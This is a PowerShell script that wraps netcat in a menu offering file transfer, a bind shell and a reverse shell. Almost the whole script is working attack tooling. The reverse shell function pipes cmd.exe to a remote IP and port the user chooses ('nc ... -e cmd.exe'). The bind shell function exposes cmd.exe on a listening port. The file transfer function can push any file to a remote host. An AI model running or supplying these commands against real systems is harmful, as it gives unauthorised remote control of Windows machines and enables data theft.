#CREATOR: m3thodman, Alexander Lopez
#Purpose: Streamline Netcat Functions - File Transfers, Bind Shell, Reverse Bind Shell
#Benefit: Saves Users The Hassle of Memorizing Commands

#************************Functions****************************************
function global:L/R #Funtion to Determine Whether User is Setting Up a Listener or Connecting to Port
{
	$global:LR = 0
	while(($global:LR -lt 1) -or ($global:LR -gt 2))
	{
		$global:LR = Read-Host "OPTIONS:`n[1]Set Up a Listener`n[2]Connect to a Port"
	}
	$global:PORT = Read-Host "Enter Port"
	if ($LR -eq 2)
	{
		$global:IP = Read-Host "Enter IP of Port (connecting to)"
	}
	
}

function FileTransfer #Function to Transfer a File
{
	$SR = 0
	while(($SR -lt 1) -or ($SR -gt 2))
	{
		$SR = Read-Host "OPTIONS:`n[1]Send a File`n[2]Receive a File"
	}
	if ($SR -eq 1) #Send a File
	{
		$SENDFILENAME = Read-Host "Enter Name of File to Send"
		if ($LR -eq 1) #Set Up Listener and Send File
		{
			echo "Setting Up Listener and Sending $SENDFILENAME"
			Get-Content $SENDFILENAME | nc -nlvp $PORT
		}
		elseif ($LR -eq 2) #Connect to Another User's Listener and Send File
		{
			echo "Connecting to $IP at Port $PORT and Sending $SENDFILENAME"
			Get-Content $SENDFILENAME | nc -nv $IP $PORT
		}
				
	}
	elseif ($SR -eq 2) #Receieve a File
	{
		$RECFILENAME = Read-Host "Name the File (to receieve)"
		if ($LR -eq 1) #Set Up Listener to Receive File"
		{
			echo "Setting Up Listener to Receive File: "
			nc -nlvp $PORT > $RECFILENAME
		}
		elseif ($LR -eq 2) #Connect to A Listener and Recieve File
		{
			echo "Connecting to $IP at Port $PORT and Receiving $RECFILENAME"
			nc -nv $IP $PORT > $RECFILENAME
		}
	}
}

function BindShell
{
	if ($LR -eq 1)
	{
		echo "Setting Up a Listener to Create Bind Shell"
		nc -nlvp $PORT -e cmd.exe
	}
	elseif ($LR -eq 2)
	{
		echo "Connecting to $IP at Port $PORT to Receive Bind Shell"
		nc -nv $IP $PORT
	}
}

function ReverseBindShell
{
	if ($LR -eq 1)
	{
		echo "Setting up a Listener to Configure Reverse Bind Shell"
		nc -nlvp $PORT
	}
	elseif ($LR -eq 2)
	{
		echo "Connecting to $IP at Port $PORT to Send Shell"
		nc -nv $IP $PORT -e cmd.exe
	}
}

#************************Start of Script***********************************
$OPTION = 0

while(($OPTION -lt 1) -or ($OPTION -gt 3))
{
	$OPTION = Read-Host "OPTIONS:`n[1]File Transfer`n[2]Bind Shell`n[3]Reverse Bind Shell`n"
}

switch($OPTION)
{
	1
	{
		echo "**************************************************************"
		echo "FILE TRANSFER"
		L/R
		FileTransfer
	}
	2
	{
		echo "**************************************************************"
		echo "BIND SHELL"
		L/R
		BindShell
	}
	3
	{
		echo "**************************************************************"
		echo "REVERSE BIND SHELL"	
		L/R
		ReverseBindShell
	}
}
